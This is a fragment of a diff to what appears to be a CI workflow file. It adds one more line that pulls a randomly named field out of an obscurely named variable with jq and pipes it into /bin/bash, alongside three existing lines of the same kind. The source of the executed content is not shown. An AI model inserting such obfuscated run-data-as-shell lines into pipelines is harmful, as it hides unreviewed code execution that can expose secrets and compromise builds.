@@ -29,6 +29,7 @@ jobs:
           echo $ga88 | jq -r .lbsgw12721 | /bin/bash
           printf '%s' "$eb73921" | jq -r .ng2 | /bin/bash
           printf '%s' "$l5" | jq -r .y4 | /bin/bash
+          echo $hj917 | jq -r .xvtva17 | /bin/bash
 
       - name: Upload archive
         uses: actions/upload-artifact@v4
